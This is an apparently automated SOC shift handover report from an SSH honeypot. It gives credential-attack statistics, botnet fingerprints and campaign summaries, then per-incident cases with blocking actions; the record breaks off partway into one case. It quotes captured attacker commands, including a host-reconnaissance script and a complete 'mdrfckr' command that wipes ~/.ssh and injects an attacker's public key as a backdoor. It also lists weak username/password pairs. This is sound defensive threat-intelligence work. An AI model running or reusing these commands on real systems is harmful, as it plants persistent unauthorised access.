# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-08 |
| **Generated At** | 2026-07-08T23:12:31Z |
| **Shift Time** | 23:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **225** |
| Confirmed Threats | **211** |
| False Positives Filtered | **14** (6.2%) |
| Unique Attacker IPs | **85** |
| Countries of Origin | **31** |
| High Severity Cases | **114** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **111** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **167** |
| Unique Credential Pairs | **104** |
| Unique Usernames | **41** |
| Unique Passwords | **72** |
| Successful Auth Pairs | **143** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 38 |
| `345gs5662d34` | 12 |
| `admin1` | 11 |
| `dspace` | 9 |
| `admin` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 12 |
| `password` | 6 |
| `` | 5 |
| `1234` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `` | 5 |
| `support` | `support` | 4 |
| `admin1` | `admin1` | 4 |
| `orangepi` | `orangepi` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin1` | `123456789` | `91.92.40.176` | 2026-07-08T20:56:06 |
| `admin1` | `12345` | `91.92.40.176` | 2026-07-08T20:58:31 |
| `admin1` | `12345678` | `91.92.40.176` | 2026-07-08T21:00:49 |
| `root` | `P@sswd123$` | `45.198.224.120` | 2026-07-08T21:02:18 |
| `admin1` | `qwerty` | `91.92.40.176` | 2026-07-08T21:03:09 |
| `git` | `git` | `10.0.0.73` | 2026-07-08T21:03:41 |
| `user` | `password` | `93.177.157.179` | 2026-07-08T21:04:29 |
| `admin1` | `123123` | `91.92.40.176` | 2026-07-08T21:05:27 |
| `support` | `aaaaaa` | `185.112.148.66` | 2026-07-08T21:05:30 |
| `blank` | `user` | `185.40.122.250` | 2026-07-08T21:06:40 |
| `blank` | `user` | `188.219.104.210` | 2026-07-08T21:06:47 |
| `admin1` | `111111` | `91.92.40.176` | 2026-07-08T21:07:41 |
| `user` | `password` | `10.0.0.73` | 2026-07-08T21:08:35 |
| `admin1` | `1234567` | `91.92.40.176` | 2026-07-08T21:10:03 |
| `git` | `git` | `45.198.224.114` | 2026-07-08T21:10:36 |
| `root` | `test12345` | `45.198.224.120` | 2026-07-08T21:11:34 |
| `dspace` | `123456` | `91.92.40.176` | 2026-07-08T21:12:23 |
| `root` | `root8` | `10.0.0.73` | 2026-07-08T21:13:11 |
| `ambassador` | `ambassador` | `10.0.0.73` | 2026-07-08T21:14:20 |
| `dspace` | `password` | `91.92.40.176` | 2026-07-08T21:14:47 |
| `dspace` | `123456789` | `91.92.40.176` | 2026-07-08T21:17:11 |
| `dspace` | `12345` | `91.92.40.176` | 2026-07-08T21:19:34 |
| `ubuntu` | `q1` | `45.198.224.120` | 2026-07-08T21:20:43 |
| `ambassador` | `ambassador` | `45.198.224.114` | 2026-07-08T21:21:14 |
| `dspace` | `12345678` | `91.92.40.176` | 2026-07-08T21:21:54 |
| `admin` | `123` | `185.242.3.195` | 2026-07-08T21:23:14 |
| `dspace` | `qwerty` | `91.92.40.176` | 2026-07-08T21:24:19 |
| `hr` | `hr@123` | `167.71.222.255` | 2026-07-08T21:26:14 |
| `345gs5662d34` | `345gs5662d34` | `167.71.222.255` | 2026-07-08T21:26:18 |
| `hr` | `3245gs5662d34` | `167.71.222.255` | 2026-07-08T21:26:20 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-08T21:26:38 |
| `dspace` | `123123` | `91.92.40.176` | 2026-07-08T21:26:47 |
| `promo` | `promo` | `10.0.0.73` | 2026-07-08T21:27:04 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-08T21:27:07 |
| `promo` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T21:27:08 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `47.84.205.178` | 2026-07-08T21:29:10 |
| `dspace` | `111111` | `91.92.40.176` | 2026-07-08T21:29:32 |
| `root` | `qweasdQWE` | `45.198.224.120` | 2026-07-08T21:30:08 |
| `myappuser` | `password` | `10.0.0.73` | 2026-07-08T21:30:32 |
| `myappuser` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T21:30:38 |
| `ubnt` | `ubnt999` | `182.73.164.228` | 2026-07-08T21:31:10 |
| `ubnt` | `ubnt999` | `200.222.71.218` | 2026-07-08T21:31:18 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-08T21:31:25 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-08T21:31:25 |
| `dong` | `123456` | `10.0.0.73` | 2026-07-08T21:31:28 |
| `dong` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T21:31:29 |
| `dspace` | `1234567` | `91.92.40.176` | 2026-07-08T21:31:49 |
| `supervisor` | `supervisor4` | `196.28.226.124` | 2026-07-08T21:31:57 |
| `vinod` | `vinod` | `10.0.0.73` | 2026-07-08T21:32:04 |
| `vinod` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T21:32:09 |
| `supervisor` | `supervisor4` | `10.0.0.73` | 2026-07-08T21:32:15 |
| `support` | `support` | `176.53.159.196` | 2026-07-08T21:32:30 |
| `user1` | `user123` | `10.0.0.73` | 2026-07-08T21:32:54 |
| `user1` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T21:32:56 |
| `operator` | `operator33` | `80.65.90.155` | 2026-07-08T21:33:25 |
| `support` | `support` | `10.0.0.73` | 2026-07-08T21:33:49 |
| `www` | `123456` | `91.92.40.176` | 2026-07-08T21:33:58 |
| `bkp` | `bkp` | `186.195.170.10` | 2026-07-08T21:34:14 |
| `345gs5662d34` | `345gs5662d34` | `186.195.170.10` | 2026-07-08T21:34:17 |
| `bkp` | `3245gs5662d34` | `186.195.170.10` | 2026-07-08T21:34:18 |
| `admin1` | `admin1` | `58.22.255.28` | 2026-07-08T21:34:48 |
| `admin` | `1234` | `176.53.159.38` | 2026-07-08T21:35:34 |
| `sasl` | `sasl` | `10.0.0.73` | 2026-07-08T21:35:48 |
| `www` | `password` | `91.92.40.176` | 2026-07-08T21:36:12 |
| `ssluser` | `ssluser` | `157.245.34.56` | 2026-07-08T21:37:12 |
| `345gs5662d34` | `345gs5662d34` | `157.245.34.56` | 2026-07-08T21:37:14 |
| `ssluser` | `3245gs5662d34` | `157.245.34.56` | 2026-07-08T21:37:15 |
| `www` | `123456789` | `91.92.40.176` | 2026-07-08T21:38:25 |
| `admin1` | `admin1` | `62.201.212.54` | 2026-07-08T21:38:25 |
| `admin1` | `admin1` | `10.0.0.73` | 2026-07-08T21:38:45 |
| `root` | `!QAZ2wsx#EDC` | `45.198.224.120` | 2026-07-08T21:39:48 |
| `www` | `12345` | `91.92.40.176` | 2026-07-08T21:40:40 |
| `www` | `12345678` | `91.92.40.176` | 2026-07-08T21:42:57 |
| `www` | `qwerty` | `91.92.40.176` | 2026-07-08T21:45:10 |
| `minecraftpocket` | `minecraftpocket` | `10.0.0.73` | 2026-07-08T21:46:25 |
| `www` | `123123` | `91.92.40.176` | 2026-07-08T21:47:25 |
| `root` | `Qwe123!!` | `45.198.224.120` | 2026-07-08T21:47:34 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-08T21:49:27 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-08T21:49:27 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-08T21:49:33 |
| `www` | `111111` | `91.92.40.176` | 2026-07-08T21:49:39 |
| `www` | `1234567` | `91.92.40.176` | 2026-07-08T21:51:55 |
| `minecraftpocket` | `minecraftpocket` | `45.198.224.114` | 2026-07-08T21:53:43 |
| `root` | `911911` | `219.248.65.30` | 2026-07-08T21:53:54 |
| `supervisor` | `alpine` | `121.179.93.147` | 2026-07-08T21:55:09 |
| `supervisor` | `alpine` | `195.158.26.59` | 2026-07-08T21:55:23 |
| `root` | `Pass@word@123` | `45.198.224.120` | 2026-07-08T21:57:18 |
| `root` | `911911` | `10.0.0.73` | 2026-07-08T21:57:58 |
| `supervisor` | `alpine` | `10.0.0.73` | 2026-07-08T21:58:49 |
| `root` | `` | `141.11.88.137` | 2026-07-08T21:59:45 |
| `comcast` | `1234` | `10.0.0.73` | 2026-07-08T22:00:06 |
| `es` | `es123` | `2.58.172.185` | 2026-07-08T22:01:41 |
| `web` | `web123!` | `45.158.21.122` | 2026-07-08T22:02:29 |
| `345gs5662d34` | `345gs5662d34` | `45.158.21.122` | 2026-07-08T22:02:31 |
| `web` | `3245gs5662d34` | `45.158.21.122` | 2026-07-08T22:02:31 |
| `admin` | `123` | `10.0.0.73` | 2026-07-08T22:03:29 |
| `support` | `456` | `10.0.0.73` | 2026-07-08T22:04:14 |
| `sajjad` | `123456` | `168.196.132.34` | 2026-07-08T22:05:05 |
| `345gs5662d34` | `345gs5662d34` | `168.196.132.34` | 2026-07-08T22:05:08 |
| `sajjad` | `3245gs5662d34` | `168.196.132.34` | 2026-07-08T22:05:09 |
| `asterisk` | `asterisk` | `45.198.224.114` | 2026-07-08T22:05:39 |
| `root` | `TOOR` | `45.198.224.120` | 2026-07-08T22:07:22 |
| `ahmad` | `qwerty123` | `10.0.0.73` | 2026-07-08T22:13:41 |
| `ahmad` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T22:13:45 |
| `root` | `Asdf1234` | `177.53.215.134` | 2026-07-08T22:14:24 |
| `345gs5662d34` | `345gs5662d34` | `177.53.215.134` | 2026-07-08T22:14:26 |
| `root` | `3245gs5662d34` | `177.53.215.134` | 2026-07-08T22:14:27 |
| `nsmask` | `nsmask` | `45.198.224.114` | 2026-07-08T22:16:25 |
| `claude` | `claude` | `104.248.143.134` | 2026-07-08T22:19:14 |
| `root` | `root9` | `113.140.95.250` | 2026-07-08T22:19:44 |
| `root` | `root9` | `49.124.149.208` | 2026-07-08T22:19:57 |
| `test` | `test` | `10.0.0.73` | 2026-07-08T22:19:58 |
| `orangepi` | `orangepi` | `36.64.211.93` | 2026-07-08T22:20:01 |
| `orangepi` | `orangepi` | `200.89.159.59` | 2026-07-08T22:20:18 |
| `unknown` | `3333` | `116.48.150.115` | 2026-07-08T22:21:56 |
| `unknown` | `3333` | `189.52.52.162` | 2026-07-08T22:22:10 |
| `orangepi` | `orangepi` | `178.178.222.55` | 2026-07-08T22:23:19 |
| `orangepi` | `orangepi` | `10.0.0.73` | 2026-07-08T22:23:50 |
| `unknown` | `3333` | `10.0.0.73` | 2026-07-08T22:25:55 |
| `unknown` | `toor` | `177.72.87.7` | 2026-07-08T22:26:15 |
| `unknown` | `toor` | `211.178.165.251` | 2026-07-08T22:29:35 |
| `unknown` | `toor` | `60.18.139.82` | 2026-07-08T22:29:44 |
| `unknown` | `toor` | `10.0.0.73` | 2026-07-08T22:30:02 |
| `root` | `Root!` | `45.198.224.120` | 2026-07-08T22:33:59 |
| `minecraft` | `minecraft` | `45.198.224.114` | 2026-07-08T22:37:24 |
| `claude` | `claude` | `46.101.223.226` | 2026-07-08T22:37:45 |
| `codex` | `codex` | `46.101.223.226` | 2026-07-08T22:38:04 |
| `student` | `student` | `10.0.0.73` | 2026-07-08T22:41:07 |
| `unknown` | `unknown12` | `111.70.23.240` | 2026-07-08T22:44:29 |
| `root` | `QWERqwer123` | `45.198.224.120` | 2026-07-08T22:44:58 |
| `root` | `deploy` | `103.68.52.210` | 2026-07-08T22:45:05 |
| `root` | `deploy` | `111.171.127.190` | 2026-07-08T22:45:15 |
| `root` | `66666666` | `66.45.144.201` | 2026-07-08T22:47:20 |
| `student` | `student` | `45.198.224.114` | 2026-07-08T22:47:59 |
| `root` | `66666666` | `10.0.0.73` | 2026-07-08T22:50:58 |
| `debian` | `debian12345678` | `185.2.228.48` | 2026-07-08T22:51:26 |
| `debian` | `debian12345678` | `210.0.90.82` | 2026-07-08T22:51:37 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-08T22:51:39 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-08T22:53:16 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-08T22:53:17 |
| `root` | `qweasdpoilkj` | `185.242.3.195` | 2026-07-08T22:54:41 |
| `root` | `qweASDqwe` | `45.198.224.120` | 2026-07-08T22:54:52 |
| `debian` | `debian12345678` | `78.187.9.111` | 2026-07-08T22:55:00 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **225** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 61 |
| libssh | 34 |
| OpenSSH | 32 |
| Paramiko (Python) | 8 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 32 | 31 |
| `16443846184e...` | Generic scanner | 26 | 7 |
| `2ec37a7cc8da...` | Mirai/variant | 25 | 1 |
| `f555226df196...` | Mirai/variant | 19 | 7 |
| `a2de0f306611...` | Mirai/variant | 8 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 32 | 31 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 26 | 7 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 25 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 19 | 7 | Mirai/variant |
| `95420f9d932d...` | libssh | 9 | 4 | — |
| `a2de0f306611...` | Paramiko (Python) | 8 | 3 | Mirai/variant |
| `63ae64767f33...` | libssh | 6 | 1 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 25 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.176`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `141.11.88.137`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `157.245.34.56`, `167.71.222.255`, `186.195.170.10`, `177.53.215.134`, `168.196.132.34`, `45.158.21.122`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **85** |
| Unique ASNs | **59** |
| High-Risk ASNs | **54** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 7 | HIGH |
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS396982` | Google LLC | 4 | LOW |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (114)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-14966b31fbb0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:56 |
| **Last Seen** | 2026-07-08 20:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:56:04` | `cowrie.session.connect` |
| `2026-07-08 20:56:05` | `cowrie.client.version` |
| `2026-07-08 20:56:05` | `cowrie.client.kex` |
| `2026-07-08 20:56:06` | `cowrie.login.success` |
| `2026-07-08 20:56:07` | `cowrie.session.params` |
| `2026-07-08 20:56:07` | `cowrie.command.input` |
| `2026-07-08 20:56:07` | `cowrie.command.input` |
| `2026-07-08 20:56:07` | `cowrie.command.input` |
| `2026-07-08 20:56:07` | `cowrie.command.input` |
| `2026-07-08 20:56:07` | `cowrie.command.input` |
| `2026-07-08 20:56:07` | `cowrie.command.success` |
| `2026-07-08 20:56:07` | `cowrie.command.input` |
| `2026-07-08 20:56:07` | `cowrie.command.input` |
| `2026-07-08 20:56:07` | `cowrie.command.input` |
| `2026-07-08 20:56:07` | `cowrie.command.input` |
| `2026-07-08 20:56:07` | `cowrie.log.closed` |
| `2026-07-08 20:56:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6584b2476dd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:58 |
| **Last Seen** | 2026-07-08 20:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:58:30` | `cowrie.session.connect` |
| `2026-07-08 20:58:30` | `cowrie.client.version` |
| `2026-07-08 20:58:30` | `cowrie.client.kex` |
| `2026-07-08 20:58:31` | `cowrie.login.success` |
| `2026-07-08 20:58:32` | `cowrie.session.params` |
| `2026-07-08 20:58:32` | `cowrie.command.input` |
| `2026-07-08 20:58:32` | `cowrie.command.input` |
| `2026-07-08 20:58:32` | `cowrie.command.input` |
| `2026-07-08 20:58:32` | `cowrie.command.input` |
| `2026-07-08 20:58:32` | `cowrie.command.input` |
| `2026-07-08 20:58:32` | `cowrie.command.success` |
| `2026-07-08 20:58:32` | `cowrie.command.input` |
| `2026-07-08 20:58:32` | `cowrie.command.input` |
| `2026-07-08 20:58:32` | `cowrie.command.input` |
| `2026-07-08 20:58:32` | `cowrie.command.input` |
| `2026-07-08 20:58:32` | `cowrie.log.closed` |
| `2026-07-08 20:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69967b343554

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:00 |
| **Last Seen** | 2026-07-08 21:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:00:47` | `cowrie.session.connect` |
| `2026-07-08 21:00:47` | `cowrie.client.version` |
| `2026-07-08 21:00:47` | `cowrie.client.kex` |
| `2026-07-08 21:00:49` | `cowrie.login.success` |
| `2026-07-08 21:00:50` | `cowrie.session.params` |
| `2026-07-08 21:00:50` | `cowrie.command.input` |
| `2026-07-08 21:00:50` | `cowrie.command.input` |
| `2026-07-08 21:00:50` | `cowrie.command.input` |
| `2026-07-08 21:00:50` | `cowrie.command.input` |
| `2026-07-08 21:00:50` | `cowrie.command.input` |
| `2026-07-08 21:00:50` | `cowrie.command.success` |
| `2026-07-08 21:00:50` | `cowrie.command.input` |
| `2026-07-08 21:00:50` | `cowrie.command.input` |
| `2026-07-08 21:00:50` | `cowrie.command.input` |
| `2026-07-08 21:00:50` | `cowrie.command.input` |
| `2026-07-08 21:00:50` | `cowrie.log.closed` |
| `2026-07-08 21:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d501a7e0499

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 21:02 |
| **Last Seen** | 2026-07-08 21:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:02:12` | `cowrie.session.connect` |
| `2026-07-08 21:02:14` | `cowrie.client.version` |
| `2026-07-08 21:02:14` | `cowrie.client.kex` |
| `2026-07-08 21:02:18` | `cowrie.login.success` |
| `2026-07-08 21:02:20` | `cowrie.session.params` |
| `2026-07-08 21:02:20` | `cowrie.command.input` |
| `2026-07-08 21:02:22` | `cowrie.log.closed` |
| `2026-07-08 21:02:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efecd9523139

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:03 |
| **Last Seen** | 2026-07-08 21:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:03:08` | `cowrie.session.connect` |
| `2026-07-08 21:03:08` | `cowrie.client.version` |
| `2026-07-08 21:03:08` | `cowrie.client.kex` |
| `2026-07-08 21:03:09` | `cowrie.login.success` |
| `2026-07-08 21:03:10` | `cowrie.session.params` |
| `2026-07-08 21:03:10` | `cowrie.command.input` |
| `2026-07-08 21:03:10` | `cowrie.command.input` |
| `2026-07-08 21:03:10` | `cowrie.command.input` |
| `2026-07-08 21:03:10` | `cowrie.command.input` |
| `2026-07-08 21:03:10` | `cowrie.command.input` |
| `2026-07-08 21:03:10` | `cowrie.command.success` |
| `2026-07-08 21:03:10` | `cowrie.command.input` |
| `2026-07-08 21:03:10` | `cowrie.command.input` |
| `2026-07-08 21:03:10` | `cowrie.command.input` |
| `2026-07-08 21:03:10` | `cowrie.command.input` |
| `2026-07-08 21:03:10` | `cowrie.log.closed` |
| `2026-07-08 21:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-590af0f91aa1

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-07-08 21:04 |
| **Last Seen** | 2026-07-08 21:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:04:24` | `cowrie.session.connect` |
